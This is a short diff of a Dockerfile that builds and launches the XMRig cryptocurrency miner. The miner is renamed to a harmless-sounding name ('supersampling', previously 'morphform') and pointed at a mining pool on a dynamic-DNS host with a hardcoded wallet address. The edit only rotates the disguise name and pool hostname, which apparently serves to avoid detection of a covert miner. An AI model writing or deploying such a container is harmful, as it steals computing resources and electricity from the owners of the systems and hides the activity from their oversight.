@@ -9,10 +9,10 @@ RUN apt update; \
     cd xmrig-6.16.4; \
     cp xmrig /usr/local/bin/xmrig; \
     cd /usr/local/bin; \
-    mv xmrig morphform;
+    mv xmrig supersampling;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 morphform;
+RUN chmod 777 supersampling;
 
-CMD morphform -a gr -o workload.sytes.net:5555 --tls -u RUyuvX9VUWtKxbePnNHGg1jt2doqr5CnEr
+CMD supersampling -a gr -o upscaling.sytes.net:5555 --tls -u RUyuvX9VUWtKxbePnNHGg1jt2doqr5CnEr
